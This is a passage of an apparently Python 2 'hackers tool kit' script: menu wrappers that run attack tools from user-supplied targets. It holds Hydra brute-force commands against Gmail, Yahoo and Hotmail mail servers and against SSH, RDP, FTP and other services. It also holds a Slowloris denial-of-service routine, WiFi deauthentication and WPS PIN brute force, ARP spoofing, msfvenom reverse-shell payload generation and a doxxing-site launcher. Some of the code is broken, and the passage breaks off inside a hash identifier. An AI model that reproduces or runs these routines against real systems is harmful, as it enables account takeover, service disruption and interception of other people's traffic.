#----------------------#
#ALL METASPLOIT AUX END#


#START METASPLOIT HANDLER START#
#------------------------------#
def multih():
	os.system("service postgresql start")
	os.system("""msfconsole -x 'use multi/handler'""")
#----------------------------#
#START METASPLOIT HANDLER END#


#ALL METASPLOIT MODS START#
#-------------------------#
def msfall():
	os.system("service postgresql start")
	os.sytem("""msfconsole -x 'show all'""")
#-----------------------#
#ALL METASPLOIT MODS END#


#HYDRA AUTOMATED START#
#---------------------#
def hydra():
	"""
	This program is just a small program to shorten brute force sessions on hydra :)
	But to be more satisfying results of the brute force. You better interact directly with hydra,
	without having to use this black hydra console first: ').
	If you find any errors in running our program. Can chat via facebook :).
	Hydra is needed for the process of this program :).
	"""
	import sys, os, time

	# Restart ####################
	def restart_program():
	   python = sys.executable
	   os.execl(python, python, * sys.argv)
	   curdir = os.getcwd()
	##############################

	os.system("clear")
	print B+"___  _    ____ ____ _  _    _  _ _   _ ___  ____ ____"
	print "|__] |    |__| |    |_/     |__|  \_/  |  \ |__/ |__|"
	print "|__] |___ |  | |___ | \_    |  |   |   |__/ |  \ |  |"
	print G+"-----------------------------------------------------"
	print N+"[]xxxxx[]::::::::::::::::::::> 24-07-2017 (7:53)"
	print R+" [*] Author: DedSecTL  ---  [*] Version 1.0"
	print N+"c=={:::::::::::::::> Black Hydra Console"
	print R+" [*] My FB : https://m.facebook.com/100004136748473"
	print N+"(}xxx{):::::::::> AndroSec1337 Cyber Team"
	print
	print "              ===|[ Brute Force ]|==="
	print
	print "  [01] Cisco Brute Force         "
	print "  [02] VNC Brute Force           "
	print "  [03] FTP Brute Force           "
	print "  [04] Gmail Brute Force         "
	print "  [05] SSH Brute Force           "
	print "  [06] TeamSpeak Brute Force     "
	print "  [07] Telnet Brute Force        "
	print "  [08] Yahoo Mail Brute Force    "
	print "  [09] Hotmail Brute Force       "
	print "  [10] Router Speedy Brute Force "
	print "  [11] RDP Brute Force           "
	print "  [12] MySQL Brute Force         "
	print
	print " [00] Exit"
	print
	bhydra = raw_input("[*] B-Hydra > ")

	if bhydra == '01' or bhydra == '1':
	  print
	  print "          +---------------------------+"
	  print "          |     Cisco Brute Force     |"
	  print "          +---------------------------+"
	  print
	  print
	  iphost = raw_input("[*] IP/Hostname : ")
	  word = raw_input("[*] Wordlist : ")
	  os.system("hydra -P %s %s cisco" % (word, iphost))
	  sys.exit()
	  
	elif bhydra == '02' or bhydra == '2':
	  print
	  print "          +---------------------------+"
	  print "          |      VNC Brute Force      |"
	  print "          +---------------------------+"
	  print
	  print
	  word = raw_input("[*] Wordlist : ")
	  iphost = raw_input("[*] IP/Hostname : ")
	  os.system("hydra -P %s -e n -t 1 %s vnc -V" % (word, iphost))
	  iphost = raw_input("[*] IP/Hostname : ")
	  
	elif bhydra == '03' or bhydra == '3':
	  print
	  print "          +------------------------------+"
	  print "          |        FTP Brute Force       |"
	  print "          +------------------------------+"
	  print
	  print
	  user = raw_input("[*] User : ")
	  iphost = raw_input("[*] IP/Hostname : ")
	  word = raw_input("[*] Wordlist : ")
	  os.system("hydra -l %s -P %s %s ftp" % (user, word, iphost))
	  sys.exit()
	  
	elif bhydra == '04' or bhydra == '4':
	  print
	  print "          +------------------------------+"
	  print "          |       Gmail Brute Force      |"
	  print "          +------------------------------+"
	  print
	  print
	  email = raw_input("[*] Email : ")
	  word = raw_input("[*] Wordlist : ")
	  os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, word))
	  sys.exit()
	  
	elif bhydra == '05' or bhydra == '5':
	   print
	   print "         +--------------------------------+"
	   print "         |        SSH Brute Force         |"
	   print "         +--------------------------------+"
	   print
	   print
	   user = raw_input("[*] User : ")
	   word = raw_input("[*] Wordlist : ")
	   iphost = raw_input("[*] IP/Hostname : ")
	   os.system("hydra -l %s -P %s %s ssh" % (user, word, iphost))
	   sys.exit()
	   
	elif bhydra == '06' or bhydra == '6':
		print
		print "        +-------------------------+"
		print "        |  TeamSpeak Brute Force  |"
		print "        +-------------------------+"
		print
		print
		user = raw_input("[*] User : ")
		word = raw_input("[*] Wordlist : ")
		iphost = raw_input("[*] IP/Hostname : ")
		os.system("hydra -l %s -P %s -s 8676 %s teamspeak" % (user, word, iphost))
		sys.exit()

	elif bhydra == '07' or bhydra == '7':
		print
		print "        +-------------------------+"
		print "        |   Telnet Brute Force    |"
		print "        +-------------------------+"
		print
		print
		user = raw_input("[*] User : ")
		word = raw_input("[*] Wordlist : ")
		iphost = raw_input("[*] IP/Hostname : ")
		os.system("hydra -l %s -P %s %s telnet" % (user, word, iphost))
		sys.exit()
		
	elif bhydra == '08' or bhydra == '8':
	  print
	  print "          +---------------------------+"
	  print "          |     Yahoo Brute Force     |"
	  print "          +---------------------------+"
	  print
	  print
	  email = raw_input("[*] Email : ")
	  word = raw_input("[*] Wordlist : ")
	  os.system("hydra -l %s -P %s -s 587 smtp.mail.yahoo.com smtp" % (email, word))
	  sys.exit()
	  
	elif bhydra == '09' or bhydra == '9':
	  print
	  print "          +----------------------------+"
	  print "          |    Hotmail Brute Force     |"
	  print "          +----------------------------+"
	  print
	  print
	  email = raw_input("[*] Email : ")
	  word = raw_input("[*] Wordlist : ")
	  os.system("hydra -l %s -P %s -s 587 smtp.live.com smtp" % (email, word))
	  sys.exit()
	  
	elif bhydra == '10':
		print
		print "        +-----------------------------+"
		print "        |  Router Speedy Brute Force  |"
		print "        +-----------------------------+"
		print
		print
		user = raw_input("[*] User : ")
		word = raw_input("[*] Wordlist : ")
		iphost = raw_input("[*] IP/Hostname : ")
		os.system("hydra -m / -l %s -P %s %s http-get" % (user, word, iphost))
		sys.exit()
		
	elif bhydra == '11':
		print
		print "        +----------------------------+"
		print "        |      RDP Brute Force       |"
		print "        +----------------------------+"
		print
		print
		user = raw_input("[*] User : ")
		word = raw_input("[*] Wordlist : ")
		iphost = raw_input("[*] IP/Hostname : ")
		os.system("hydra -t 1 -V -f -l %s -P %s %s rdp" % (user, word, iphost))
		sys.exit()
		
	elif bhydra == '12':
		print
		print "        +-----------------------------+"
		print "        |       MySQL Brute Force     |"
		print "        +-----------------------------+"
		print
		print
		user = raw_input("[*] User : ")
		word = raw_input("[*] Wordlist : ")
		os.system("hydra -t 5 -V -f -l %s -e ns -P %s localhost mysql" % (user, word))
		
	elif bhydra == '00' or bhydra == '0':
		print "\n[!] Exit the Program..."
		sys.exit()
		
	else:
		print "\n[!] ERROR : Wrong Input"
		time.sleep(1)
	restart_program()
#-------------------#
#HYDRA AUTOMATED END#


#WORDLIST MAKER START#
#--------------------#
def cupp():
	os.system("cd /root/hackers-tool-kit/wordlists && cupp -i")
	print Y+"wordlist saved to /root/hackers-tool-kit/wordlists\033[0m"
#------------------#
#WORDLIST MAKER END#


#LIST FILES START#
#----------------#
def vdir():
	print "\n"
	os.system("ls")
	print Y+"! doesnt have to be these can be any directory !\033[0m"
	print "\n"
	h = raw_input("Directory Path: ")
	print "\n"
	print "--------------------------------------------------------------------------------------------------------------------------------------------"
	os.system("ls " + h)
	print "--------------------------------------------------------------------------------------------------------------------------------------------"
#--------------#
#LIST FILES END#


#MONITOR MODE OFF START#
#----------------------#
def monoff():
	os.system("iwconfig")
	i = raw_input("Select Interface: ")
	os.system("airmon-ng stop " + i)
#--------------------#
#MONITOR MODE OFF END#


#TURN ON VPN START#
#-----------------#
def vpn():
	os.system("anonsurf start")
	os.system("anonsurf myip")
#---------------#
#TURN ON VPN END#


#TURN OFF VPN START#
#------------------#
def vpnoff():
	os.system("anonsurf stop")
	os.system("anonsurf myip")
#----------------#
#TURN OFF VPN END#


#SLOW LORIS DOS START#
#--------------------#
def slowl():
	de = raw_input("Delay: ")
	tar = raw_input("RHOST: ")
	port = raw_input("RPORT: ")
	soc = raw_input("Sockets: ")
	os.system('echo "use auxiliary/dos/http/slowloris\n" > slowl.rc')
	os.system('echo "set delay {0}\n" >> slowl.rc'.format(de))
	os.system('echo "set RHOST {0}\n" >> slowl.rc'.format(tar))
	os.system('echo "set RPORT {0}\n" >> slowl.rc'.format(port))
	os.system('echo "set sockets {0}\n" >> slowl.rc'.format(soc))
	os.system('echo "run\n" >> slowl.rc')
	os.system('msfconsole -r slowl.rc')
	os.system('rm -rf slowl.rc')
#------------------#
#SLOW LORIS DOS END#


#OPEN DOX WEBSITE START#
#----------------------#
def pidox():
	print Y+"! USING FIREFOX !\033[0m"
	os.system("sleep 2")
	os.system("firefox https://pipl.com/")
#--------------------#
#OPEN DOX WEBSITE END#


#SCAN SPECIFIC NET START#
#-----------------------#
def specnet():
	jk = raw_input("BSSID: ")
	kj = raw_input("ESSID: ")
	os.system("iwconfig")
	k = raw_input("INTERFACE: ")
	print Y+"WOULD YOU LIKE TO SAVE YOUR SCAN RESULTS?\033[0m"
	j = raw_input("[y/n]> ")
	if j == "y":
		a = 'airodump-ng -w /root/SCAN --bssid {0} --essid {1} {2}'.format(jk,kj,k)
		os.system(a)
	if j == "n":
		a = 'airodump-ng --bssid {0} --essid {1} {2}'.format(jk,kj,k)
		os.system(a)
#---------------------#
#SCAN SPECIFIC NET END#


#DEFAULT WIFI PIN START#
#----------------------#
def pingen():
	j = raw_input("Enter BSSID: ")
	a = 'cd /root/hackers-tool-kit/tools && python pingen.py {0}'.format(j)
	os.system(a)
#--------------------#
#DEFAULT WIFI PIN END#


#WIFI PIN BRUTEFORCE START#
#-------------------------#
def reaver():
	os.system("iwconfig")
	j = raw_input("Select Interface: ")
	k = raw_input("Enter BSSID: ")
	a = 'reaver -i {0} -b {1} -vv'.format(j,k)
	os.system(a)
#-----------------------#
#WIFI PIN BRUTEFORCE END#


#DEAUTH ATTACK START#
#-------------------#
def deauth():
	print Y+"! YOU MAY HAVE TO CHANGE YOUR WIFI CHANNEL !\033[0m"
	j = raw_input("Enter BSSID> ")
	os.system("iwconfig")
	k = raw_input("Enter Interface> ")
	a = 'aireplay-ng -0 0 -a {0} {1}'.format(j,k)
	os.system(a)
#-----------------#
#DEAUTH ATTACK END#


#MAC CHANGER START#
#-----------------#
def macc():
	os.system("iwconfig")
	k = raw_input("Interface: ")
	c = 'ifconfig {0} down'.format(k)
	os.system(c)
	os.system("macchanger -r " + k)
	s = 'ifconfig {0} up'.format(k)
	os.system(s)
#-----------------#
#MAC CHANGER START#


#MAC CHANGER OFF START#
#---------------------#
def macoff():
	os.system("iwconfig")
	k = raw_input("Interface: ")
	c = 'ifconfig {0} down'.format(k)
	os.system(c)
	os.system("macchanger -p " + k)
	s = 'ifconfig {0} up'.format(k)
	os.system(s)
#-------------------#
#MAC CHANGER OFF END#


#ARP SPOOF START#
#---------------#
def arpspoof():
	print "\033[93mif using multiple targets heres an example:	134.143.1.3, 134.143.1.6\033[0m\n"
	h = raw_input("Targets: ")
	os.system('echo "net.sniff on\n" >> arp.cap')
	os.system('echo "set arp.spoof.targets {0}\n" >> arp.cap'.format(h))
	os.system('echo "arp.spoof on\n" >> arp.cap')
	print '\n\033[93mto stop type "exit"\033[0m'
	os.system("sleep 2")
	os.system("bettercap -no-history -caplet arp.cap")
	os.system("rm arp.cap")
#-------------#
#ARP SPOOF END#


#SSL SCAN START#
#--------------#
def sslscan():
	j = raw_input('Enter Target: ')
	a = 'sslscan {0}'.format(j)
	os.system(a)
#------------#
#SSL SCAN END#


#MAKE A PAYLOAD START#
#--------------------#
def payload():
	os.system("cat /root/hackers-tool-kit/tools/payloads.txt")
	print "\n"
	f = raw_input("Select Payload: ")
	l = raw_input("LHOST: ")
	c = raw_input("LPORT: ")
	print "\nExamples: py, php, exe\n"
	s = raw_input("File Format: ")
	h = raw_input("File Name: ")
	a = 'msfvenom -p {0} LHOST={1} LPORT={2} -o /root/{3}.{4}'.format(f,l,c,h,s)
	os.system(a)
#------------------#
#MAKE A PAYLOAD END#


#WORDLIST MAKER START#
#--------------------#
def crunch():
	print "minimal number of characters"	
	j = raw_input("[CRUNCH]: ")
	print "maximum number of characters"
	k = raw_input("[CRUNCH]: ")
	print "what characters should be in it"
	b = raw_input("[CRUNCH]: ")
	print "name of file"
	s = raw_input("[CRUNCH]: ")
	a = 'crunch {0} {1} {2} -o /root/hackers-tool-kit/wordlists/{3}'.format(j,k,b,s)
	os.system(a)
	print Y+"wordlist saved to \033[0m/root/hackers-tool-kit/wordlists/" + s
#------------------#
#WORDLIST MAKER END#


#INTERNET TRAFFIC START#
#----------------------#
def traff():
	os.system("iwconfig")
	s = raw_input("Select Interface: ")
	os.system("tcpdump -i " + s)
#--------------------#
#INTERNET TRAFFIC END#


#RESET ACCOUNT PASSWORD START#
#----------------------------#
def resa():
	j = raw_input("USERNAME: ")
	k = raw_input("NEW PASSWORD: ")
	print "are you sure?"
	q = raw_input("[y/n]: ")
	if q == "n":
		os.system("clear")
		mainbanner()
	if q == "y":
		a = 'echo "{0}:{1}" | chpasswd'.format(j,k)
		print "password for {0} has been reset".format(j)
#--------------------------#
#RESET ACCOUNT PASSWORD END#


#RESET UNIX PASSWORD START#
#-------------------------#
def resu():
	j = raw_input("PASSWORD: ")
	print "are you sure?"
	q = raw_input("[y/n]: ")
	if q == "n":
		os.system("clear")
		mainbanner()
	if q == "y":
		a = 'passwd {0}'.format(j)
		print "unix password has been reset".format(j)
#-----------------------#
#RESET UNIX PASSWORD END#


#FIND HASH TYPE START#
#--------------------#
def hashid():
	#!/usr/bin/python
	# encoding: utf-8
	# Hash Identifier v1.1
	# By Zion3R
	# www.Blackploit.com
	# Root@Blackploit.com

	logo='''           #########################################################################
	   #	 __  __ 		    __		 ______    _____	   #
	   #	/\ \/\ \		   /\ \ 	/\__  _\  /\  _ `\	   #
	   #	\ \ \_\ \     __      ____ \ \ \___	\/_/\ \/  \ \ \/\ \	   #
	   #	 \ \  _  \  /'__`\   / ,__\ \ \  _ `\	   \ \ \   \ \ \ \ \	   #
	   #	  \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \	    \_\ \__ \ \ \_\ \	   #
	   #	   \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/	   #
	   #	    \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.1 #
	   #								 By Zion3R #
	   #							www.Blackploit.com #
	   #						       Root@Blackploit.com #
	   #########################################################################'''

	algorithms={"102020":"ADLER-32", "102040":"CRC-32", "102060":"CRC-32B", "101020":"CRC-16", "101040":"CRC-16-CCITT", "104020":"DES(Unix)", "101060":"FCS-16", "103040":"GHash-32-3", "103020":"GHash-32-5", "115060":"GOST R 34.11-94", "109100":"Haval-160", "109200":"Haval-160(HMAC)", "110040":"Haval-192", "110080":"Haval-192(HMAC)", "114040":"Haval-224", "114080":"Haval-224(HMAC)", "115040":"Haval-256", "115140":"Haval-256(HMAC)", "107080":"Lineage II C4", "106025":"Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))", "102080":"XOR-32", "105060":"MD5(Half)", "105040":"MD5(Middle)", "105020":"MySQL", "107040":"MD5(phpBB3)", "107060":"MD5(Unix)", "107020":"MD5(Wordpress)", "108020":"MD5(APR)", "106160":"Haval-128", "106165":"Haval-128(HMAC)", "106060":"MD2", "106120":"MD2(HMAC)", "106040":"MD4", "106100":"MD4(HMAC)", "106020":"MD5", "106080":"MD5(HMAC)", "106140":"MD5(HMAC(Wordpress))", "106029":"NTLM", "106027":"RAdmin v2.x", "106180":"RipeMD-128", "106185":"RipeMD-128(HMAC)", "106200":"SNEFRU-128", "106205":"SNEFRU-128(HMAC)", "106220":"Tiger-128", "106225":"Tiger-128(HMAC)", "106240":"md5($pass.$salt)", "106260":"md5($salt.'-'.md5($pass))", "106280":"md5($salt.$pass)", "106300":"md5($salt.$pass.$salt)", "106320":"md5($salt.$pass.$username)", "106340":"md5($salt.md5($pass))", "106360":"md5($salt.md5($pass).$salt)", "106380":"md5($salt.md5($pass.$salt))", "106400":"md5($salt.md5($salt.$pass))", "106420":"md5($salt.md5(md5($pass).$salt))", "106440":"md5($username.0.$pass)", "106460":"md5($username.LF.$pass)", "106480":"md5($username.md5($pass).$salt)", "106500":"md5(md5($pass))", "106520":"md5(md5($pass).$salt)", "106540":"md5(md5($pass).md5($salt))", "106560":"md5(md5($salt).$pass)", "106580":"md5(md5($salt).md5($pass))", "106600":"md5(md5($username.$pass).$salt)", "106620":"md5(md5(md5($pass)))", "106640":"md5(md5(md5(md5($pass))))", "106660":"md5(md5(md5(md5(md5($pass)))))", "106680":"md5(sha1($pass))", "106700":"md5(sha1(md5($pass)))", "106720":"md5(sha1(md5(sha1($pass))))", "106740":"md5(strtoupper(md5($pass)))", "109040":"MySQL5 - SHA-1(SHA-1($pass))", "109060":"MySQL 160bit - SHA-1(SHA-1($pass))", "109180":"RipeMD-160(HMAC)", "109120":"RipeMD-160", "109020":"SHA-1", "109140":"SHA-1(HMAC)", "109220":"SHA-1(MaNGOS)", "109240":"SHA-1(MaNGOS2)", "109080":"Tiger-160", "109160":"Tiger-160(HMAC)", "109260":"sha1($pass.$salt)", "109280":"sha1($salt.$pass)", "109300":"sha1($salt.md5($pass))", "109320":"sha1($salt.md5($pass).$salt)", "109340":"sha1($salt.sha1($pass))", "109360":"sha1($salt.sha1($salt.sha1($pass)))", "109380":"sha1($username.$pass)", "109400":"sha1($username.$pass.$salt)", "1094202":"sha1(md5($pass))", "109440":"sha1(md5($pass).$salt)", "109460":"sha1(md5(sha1($pass)))", "109480":"sha1(sha1($pass))", "109500":"sha1(sha1($pass).$salt)", "109520":"sha1(sha1($pass).substr($pass,0,3))", "109540":"sha1(sha1($salt.$pass))", "109560":"sha1(sha1(sha1($pass)))", "109580":"sha1(strtolower($username).$pass)", "110020":"Tiger-192", "110060":"Tiger-192(HMAC)", "112020":"md5($pass.$salt) - Joomla", "113020":"SHA-1(Django)", "114020":"SHA-224", "114060":"SHA-224(HMAC)", "115080":"RipeMD-256", "115160":"RipeMD-256(HMAC)", "115100":"SNEFRU-256", "115180":"SNEFRU-256(HMAC)", "115200":"SHA-256(md5($pass))", "115220":"SHA-256(sha1($pass))", "115020":"SHA-256", "115120":"SHA-256(HMAC)", "116020":"md5($pass.$salt) - Joomla", "116040":"SAM - (LM_hash:NT_hash)", "117020":"SHA-256(Django)", "118020":"RipeMD-320", "118040":"RipeMD-320(HMAC)", "119020":"SHA-384", "119040":"SHA-384(HMAC)", "120020":"SHA-256", "121020":"SHA-384(Django)", "122020":"SHA-512", "122060":"SHA-512(HMAC)", "122040":"Whirlpool", "122080":"Whirlpool(HMAC)"}

	# hash.islower()  minusculas
	# hash.isdigit()  numerico
	# hash.isalpha()  letras
	# hash.isalnum()  alfanumerico

	def CRC16():
	    hs='4607'
	    if len(hash)==len(hs) and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("101020")
	def CRC16CCITT():
	    hs='3d08'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("101040")
	def FCS16():
	    hs='0e5b'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("101060")

	def CRC32():
	    hs='b33fd057'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("102040")
	def ADLER32():
	    hs='0607cb42'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("102020")
	def CRC32B():
	    hs='b764a0d9'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("102060")
	def XOR32():
	    hs='0000003f'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("102080")

	def GHash323():
	    hs='80000000'
	    if len(hash)==len(hs) and hash.isdigit()==True and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("103040")
	def GHash325():
	    hs='85318985'
	    if len(hash)==len(hs) and hash.isdigit()==True and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("103020")

	def DESUnix():
	    hs='ZiY8YtDKXJwYQ'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False:
		jerar.append("104020")

	def MD5Half():
	    hs='ae11fd697ec92c7c'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("105060")
	def MD5Middle():
	    hs='7ec92c7c98de3fac'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("105040")
	def MySQL():
	    hs='63cea4673fd25f46'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("105020")

	def DomainCachedCredentials():
	    hs='f42005ec1afe77967cbc83dce1b4d714'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106025")
	def Haval128():
	    hs='d6e3ec49aa0f138a619f27609022df10'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106160")
	def Haval128HMAC():
	    hs='3ce8b0ffd75bc240fc7d967729cd6637'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106165")
	def MD2():
	    hs='08bbef4754d98806c373f2cd7d9a43c4'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106060")
	def MD2HMAC():
	    hs='4b61b72ead2b0eb0fa3b8a56556a6dca'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106120")
	def MD4():
	    hs='a2acde400e61410e79dacbdfc3413151'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106040")
	def MD4HMAC():
	    hs='6be20b66f2211fe937294c1c95d1cd4f'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106100")
	def MD5():
	    hs='ae11fd697ec92c7c98de3fac23aba525'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106020")
	def MD5HMAC():
	    hs='d57e43d2c7e397bf788f66541d6fdef9'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106080")
	def MD5HMACWordpress():
	    hs='3f47886719268dfa83468630948228f6'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106140")
	def NTLM():
	    hs='cc348bace876ea440a28ddaeb9fd3550'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106029")
	def RAdminv2x():
	    hs='baea31c728cbf0cd548476aa687add4b'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106027")
	def RipeMD128():
	    hs='4985351cd74aff0abc5a75a0c8a54115'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106180")
	def RipeMD128HMAC():
	    hs='ae1995b931cf4cbcf1ac6fbf1a83d1d3'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106185")
	def SNEFRU128():
	    hs='4fb58702b617ac4f7ca87ec77b93da8a'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106200")
	def SNEFRU128HMAC():
	    hs='59b2b9dcc7a9a7d089cecf1b83520350'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106205")
	def Tiger128():
	    hs='c086184486ec6388ff81ec9f23528727'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106220")
	def Tiger128HMAC():
	    hs='c87032009e7c4b2ea27eb6f99723454b'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106225")
	def md5passsalt():
	    hs='5634cc3b922578434d6e9342ff5913f7'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106240")
	def md5saltmd5pass():
	    hs='245c5763b95ba42d4b02d44bbcd916f1'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106260")
	def md5saltpass():
	    hs='22cc5ce1a1ef747cd3fa06106c148dfa'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106280")
	def md5saltpasssalt():
	    hs='469e9cdcaff745460595a7a386c4db0c'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106300")
	def md5saltpassusername():
	    hs='9ae20f88189f6e3a62711608ddb6f5fd'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106320")
	def md5saltmd5pass():
	    hs='aca2a052962b2564027ee62933d2382f'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106340")
	def md5saltmd5passsalt():
	    hs='de0237dc03a8efdf6552fbe7788b2fdd'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106360")
	def md5saltmd5passsalt():
	    hs='5b8b12ca69d3e7b2a3e2308e7bef3e6f'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106380")
	def md5saltmd5saltpass():
	    hs='d8f3b3f004d387086aae24326b575b23'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106400")
	def md5saltmd5md5passsalt():
	    hs='81f181454e23319779b03d74d062b1a2'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106420")
	def md5username0pass():
	    hs='e44a60f8f2106492ae16581c91edb3ba'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106440")
	def md5usernameLFpass():
	    hs='654741780db415732eaee12b1b909119'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106460")
	def md5usernamemd5passsalt():
	    hs='954ac5505fd1843bbb97d1b2cda0b98f'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106480")
	def md5md5pass():
	    hs='a96103d267d024583d5565436e52dfb3'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106500")
	def md5md5passsalt():
	    hs='5848c73c2482d3c2c7b6af134ed8dd89'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106520")
	def md5md5passmd5salt():
	    hs='8dc71ef37197b2edba02d48c30217b32'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106540")
	def md5md5saltpass():
	    hs='9032fabd905e273b9ceb1e124631bd67'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106560")
	def md5md5saltmd5pass():
	    hs='8966f37dbb4aca377a71a9d3d09cd1ac'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106580")
	def md5md5usernamepasssalt():
	    hs='4319a3befce729b34c3105dbc29d0c40'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106600")
	def md5md5md5pass():
	    hs='ea086739755920e732d0f4d8c1b6ad8d'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106620")
	def md5md5md5md5pass():
	    hs='02528c1f2ed8ac7d83fe76f3cf1c133f'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106640")
	def md5md5md5md5md5pass():
	    hs='4548d2c062933dff53928fd4ae427fc0'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106660")
	def md5sha1pass():
	    hs='cb4ebaaedfd536d965c452d9569a6b1e'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106680")
	def md5sha1md5pass():
	    hs='099b8a59795e07c334a696a10c0ebce0'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106700")
	def md5sha1md5sha1pass():
	    hs='06e4af76833da7cc138d90602ef80070'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106720")
	def md5strtouppermd5pass():
	    hs='519de146f1a658ab5e5e2aa9b7d2eec8'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True:
		jerar.append("106740")

	def LineageIIC4():
	    hs='0x49a57f66bd3d5ba6abda5579c264a0e4'
	    if len(hash)==len(hs) and hash.isdigit()==False and hash.isalpha()==False and hash.isalnum()==True and hash[0:2].find('0x')==0:
		jerar.append("107080")
	def MD5phpBB3():
	    hs='$H$9kyOtE8CDqMJ44yfn9PFz2E.L2oVzL1'
